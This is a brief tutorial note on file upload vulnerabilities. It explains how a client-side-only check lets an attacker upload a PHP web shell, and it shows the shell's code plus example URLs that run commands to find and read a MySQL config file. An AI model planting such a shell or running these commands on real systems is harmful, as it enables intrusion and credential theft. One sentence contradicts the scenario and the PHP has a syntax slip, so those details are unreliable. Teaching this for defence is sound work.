# File upload vulnerabilities

In the example scenario Mal, the hacker, finds out that a profile picture file is checked via JavaScript on the client-side. He writes a PHP script and uploads it as his profile image by disabling JavaScript in his browser.

His file URL is not executable by the server:
```php
<?php
	if(isset($_REQUEST['cmd'])) {
		$cmd = ($_REQUEST['cmd']);
		system($cmd);
	} else {
		echo 'Hello There!'
	}
?>
```

`facebook.com/1a32D/hack.php?cmd=locate my.cnf`
`facebook.com/1a32D/hack.php?cmd=cat /etc/mysql/my.cnf`